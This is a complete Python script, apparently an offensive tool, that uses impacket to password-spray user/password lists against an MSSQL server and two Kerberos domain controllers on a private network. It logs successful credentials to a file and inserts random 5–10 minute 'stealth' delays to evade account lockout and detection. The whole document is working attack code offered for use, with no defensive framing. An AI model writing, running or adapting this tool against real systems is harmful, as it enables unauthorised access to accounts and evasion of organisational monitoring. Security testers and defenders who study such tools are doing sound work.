import argparse
import random
import time
import datetime
from impacket.krb5.asn1 import AS_REQ
from impacket.krb5.types import Principal
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import KerberosError
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.kerberosv5 import sendReceive as krb_send  # fallback if needed
from impacket.krb5.keytab import Keytab
from impacket.krb5.kerberosv5 import KerberosCredential, getKerberosTGS
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.examples import logger
from impacket.examples.mssqlclient import MSSQL
from impacket.smbconnection import SMBConnection
import socket
import sys
from pathlib import Path

def try_kerberos(username, password, domain, dc_ip):
    try:
        tgt, cipher, session_key = getKerberosTGT(
            Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value),
            password,
            domain,
            None,
            dc_ip
        )
        return True
    except KerberosError as e:
        return False
    except Exception as e:
        return False

def try_mssql(username, password, target_ip):
    try:
        client = MSSQL(target_ip, username=username, password=password, domain='', windows_auth=True)
        client.connect()
        return True
    except Exception:
        return False

def main():
    parser = argparse.ArgumentParser(description="Stealth password spray tool for Kerberos and MSSQL.")
    parser.add_argument("-u", "--userfile", required=True, help="Path to file with usernames")
    parser.add_argument("-p", "--passfile", required=True, help="Path to file with passwords")
    parser.add_argument("-o", "--outfile", default="spray_results.txt", help="Output file (appended)")
    args = parser.parse_args()

    domain_controllers = ['192.168.1.2', '192.168.1.24']
    mssql_target = '192.168.1.22'
    usernames = Path(args.userfile).read_text().splitlines()
    passwords = Path(args.passfile).read_text().splitlines()

    group_size = 5  # max usernames per round
    username_chunks = [usernames[i:i + group_size] for i in range(0, len(usernames), group_size)]

    with open(args.outfile, "a") as out:
        for password in passwords:
            for group in username_chunks:
                for user in group:
                    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                    # Try MSSQL
                    mssql_result = try_mssql(user, password, mssql_target)
                    if mssql_result:
                        out.write(f"[{timestamp}] MSSQL SUCCESS: {user}:{password}\n")
                        out.flush()
                    else:
                        out.write(f"[{timestamp}] MSSQL FAIL: {user}:{password}\n")
                        out.flush()

                    # Try Kerberos AS-REQ
                    for dc in domain_controllers:
                        kerberos_result = try_kerberos(user, password, domain="XONGROUP", dc_ip=dc)
                        if kerberos_result:
                            out.write(f"[{timestamp}] Kerberos SUCCESS [{dc}]: {user}:{password}\n")
                            out.flush()
                        else:
                            out.write(f"[{timestamp}] Kerberos FAIL [{dc}]: {user}:{password}\n")
                            out.flush()

                # Stealth delay: 5 to 10 minutes between groups
                delay = random.randint(300, 600)
                print(f"[i] Sleeping for {delay // 60} minutes ({delay}s)...")
                time.sleep(delay)

if __name__ == "__main__":
    main()
